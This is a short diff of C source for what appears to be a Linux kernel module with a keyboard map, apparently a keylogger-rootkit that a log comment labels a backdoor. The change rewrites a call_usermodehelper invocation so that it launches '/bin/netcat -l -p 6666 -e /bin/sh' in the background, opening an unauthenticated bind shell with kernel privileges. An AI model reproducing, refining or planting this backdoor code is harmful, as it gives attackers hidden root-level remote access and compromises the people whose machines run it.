@@ -136,10 +136,12 @@ static const char* keymap_shift[] =
 
 	    //char *argv1[] = {"/bin/sh", "-c", "/bin/echo > /home/michael/here.txt", NULL}; 
 
-	    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL}; 
+	    //char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh", NULL}; 
+
+		char *argv3[] = {"/bin/netcat", "-l", "-p", "6666", "-e", "/bin/sh", NULL};
 
 	    //call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT); // Remove all netcat version
-	    call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC);
+	    call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT);
 	    #ifdef LOG
 			//printk(KERN_ERR  "BACKDOOR un-install netcat returned  %i\n", ret);
 		#endif
